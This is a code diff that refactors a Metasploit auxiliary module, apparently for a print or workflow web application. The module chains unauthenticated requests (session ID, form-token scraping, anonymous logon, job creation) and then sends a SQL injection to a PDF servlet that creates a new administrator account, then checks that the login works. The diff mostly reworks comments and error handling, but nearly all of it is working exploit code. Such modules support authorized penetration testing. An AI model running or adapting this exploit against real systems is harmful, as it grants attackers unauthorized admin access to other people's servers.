@@ -36,14 +36,13 @@ class MetasploitModule < Msf::Auxiliary
 
     register_options([
       OptString.new('TARGETURI', [true, 'Base path', '/']),
-      OptString.new('NEW_USERNAME', [true, 'Username to be used when creating a new user with admin privileges', Faker::Internet.username], regex: /^[a-z._@]+$/),
+      OptString.new('NEW_USERNAME', [true, 'Username to be used when creating a new user with admin privileges', Faker::Internet.username]),
       OptString.new('NEW_PASSWORD', [true, 'Password to be used when creating a new user with admin privileges', Rex::Text.rand_text_alpha(8)]),
       OptString.new('NEW_EMAIL', [true, 'E-mail to be used when creating a new user with admin privileges', Faker::Internet.email])
     ])
   end
 
   def run
-    # 1) Request workflow to obtain a session ID
     print_status('Starting SQL injection workflow...')
 
     res = send_request_cgi(
@@ -69,7 +68,6 @@ class MetasploitModule < Msf::Auxiliary
       fail_with(Failure::UnexpectedReply, 'JSESSIONID not found.')
     end
 
-    # 2) logon.jsp to retrieve a valid FCWEB.FORM.TOKEN
     res = send_request_cgi(
       'method' => 'GET',
       'uri' => normalize_uri(target_uri.path, "workflow/jsp/logon.jsp;jsessionid=#{jsessionid}"),
@@ -82,15 +80,14 @@ class MetasploitModule < Msf::Auxiliary
       fail_with(Failure::Unreachable, 'Failed to receive a reply from the server.')
     end
 
-    res = res.body
-    if res =~ /name="FCWEB\.FORM\.TOKEN" value="([^"]+)"/
+    body = res.body
+    if body =~ /name="FCWEB\.FORM\.TOKEN" value="([^"]+)"/
       token_value = ::Regexp.last_match(1)
       print_status("FCWEB.FORM.TOKEN value: #{token_value}")
     else
       fail_with(Failure::UnexpectedReply, 'FCWEB.FORM.TOKEN not found.')
     end
 
-    # 3) logonAnonymous.do
     res = send_request_cgi(
       'method' => 'GET',
       'uri' => normalize_uri(target_uri.path, "workflow/logonAnonymous.do?FCWEB.FORM.TOKEN=#{token_value}"),
@@ -111,7 +108,6 @@ class MetasploitModule < Msf::Auxiliary
       fail_with(Failure::UnexpectedReply, 'Location header not found.')
     end
 
-    # 4) createNewJob.do
     res = send_request_cgi(
       'method' => 'GET',
       'uri' => normalize_uri(target_uri.path, location_value.to_s),
@@ -132,7 +128,6 @@ class MetasploitModule < Msf::Auxiliary
       fail_with(Failure::UnexpectedReply, 'Location header not found.')
     end
 
-    # 5) chooseOrderForm.jsp
     res = send_request_cgi(
       'method' => 'GET',
       'uri' => normalize_uri(target_uri.path, location_value.to_s),
@@ -153,13 +148,12 @@ class MetasploitModule < Msf::Auxiliary
       if h2_text == 'Choose an Order Type'
         print_status('Received expected response.')
       else
-        fail_with(Failure::UnexpectedReply, 'Unexpected string found inside h2 tag.')
+        fail_with(Failure::UnexpectedReply, 'Unexpected string found inside h2 tag: ' + h2_text)
       end
     else
       fail_with(Failure::UnexpectedReply, 'h2 tag not found.')
     end
 
-    # 5) pdf_servlet (SQL injection)
     t = Time.now
     username = datastore['NEW_USERNAME']
     password = Digest::MD5.hexdigest(datastore['NEW_PASSWORD']).upcase
@@ -214,21 +208,12 @@ class MetasploitModule < Msf::Auxiliary
       fail_with(Failure::Unreachable, 'Failed to receive a reply from the server.')
     end
 
-    case res.code
-    when 200
-      if res.body.to_s == ''
-        print_good('SQL injection successful!')
-      else
-        fail_with(Failure::UnexpectedReply, 'Unexpected reply from the target.')
-      end
-    else
-      fail_with(Failure::UnexpectedReply, 'Unexpected reply from the target.')
-    end
+    fail_with(Failure::UnexpectedReply, "Unexpected HTTP code from the target: #{res.code}") unless res.code == 200
+    fail_with(Failure::UnexpectedReply, 'Unexpected reply from the target.') unless res.body.to_s == ''
+    print_good('SQL injection successful!')
 
-    # Confirm that the credentials work
     print_status('Confirming credentials...')
 
-    # 1) logon.jsp to retrieve a valid FCWEB.FORM.TOKEN
     res = send_request_cgi(
       'method' => 'GET',
       'uri' => normalize_uri(target_uri.path, 'workflow/jsp/logon.jsp'),
@@ -237,19 +222,16 @@ class MetasploitModule < Msf::Auxiliary
       }
     )
 
-    unless res
-      fail_with(Failure::Unreachable, 'Failed to receive a reply from the server.')
-    end
+    fail_with(Failure::Unreachable, 'Failed to receive a reply from the server.') unless res
 
-    res = res.body
-    if res =~ /name="FCWEB\.FORM\.TOKEN" value="([^"]+)"/
+    body = res.body
+    if body =~ /name="FCWEB\.FORM\.TOKEN" value="([^"]+)"/
       token_value = ::Regexp.last_match(1)
       print_status("FCWEB.FORM.TOKEN value: #{token_value}")
     else
       fail_with(Failure::UnexpectedReply, 'FCWEB.FORM.TOKEN not found.')
     end
 
-    # 2) Authenticate
     res = send_request_cgi(
       'method' => 'POST',
       'uri' => normalize_uri(target_uri.path, 'workflow/logon.do'),
